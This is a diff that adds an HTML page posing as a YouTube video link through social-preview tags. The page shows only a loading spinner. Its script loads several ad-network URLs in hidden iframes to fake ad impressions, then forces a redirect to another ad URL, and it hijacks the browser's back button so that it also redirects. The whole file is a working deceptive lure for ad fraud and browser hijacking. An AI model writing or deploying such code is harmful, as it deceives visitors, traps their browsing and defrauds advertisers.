@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Watch on YouTube</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Open Graph meta tags for social media preview -->
+  <meta property="og:title" content="Watch on YouTube">
+  <meta property="og:description" content="Click to watch the video on YouTube!">
+  <meta property="og:url" content="https://yourdomain.com/youtube">
+  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/4/42/YouTube_icon_%282013-2017%29.png">
+  <meta property="og:type" content="website">
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: #000;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    .spinner {
+      border: 8px solid #333;
+      border-top: 8px solid #fff;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    p {
+      font-size: 18px;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <p>Loading... Please wait</p>
+
+  <script>
+    const adLinks = [
+      "https://lowlifewhateverspotless.com/b24pegpa9?key=4fe4c369de36ad29534ef2ff5b3ba55c",
+      "https://lowlifewhateverspotless.com/pm30evd3?key=727285994b6301e2447126cf19fb0a7a",
+      "https://lowlifewhateverspotless.com/kb3huq1xp?key=ab4b2cb98c15598aa07d801d4fbdc36c",
+      "https://lowlifewhateverspotless.com/za2f0wy25?key=9b8d9b67f2e024d27b87d5e73c8dd482",
+      "https://lowlifewhateverspotless.com/g90v7z2tz?key=7affa2aa117c6ff827a7105b3fd7a599"
+    ];
+
+    const redirectURL = "https://lowlifewhateverspotless.com/z8zt99ys?key=0c404385e51f0a39c58eded88d13eb31";
+
+    let index = 0;
+
+    function fireImpression(link) {
+      const iframe = document.createElement("iframe");
+      iframe.src = link;
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
+    }
+
+    function loadAds() {
+      if (index < adLinks.length) {
+        fireImpression(adLinks[index]);
+        index++;
+        setTimeout(loadAds, 200);
+      } else {
+        setTimeout(() => {
+          window.location.href = redirectURL;
+        }, 1000);
+      }
+    }
+
+    history.pushState(null, "", location.href);
+    window.addEventListener("popstate", function () {
+      location.href = redirectURL;
+    });
+
+    window.onload = loadAds;
+  </script>
+</body>
+</html>
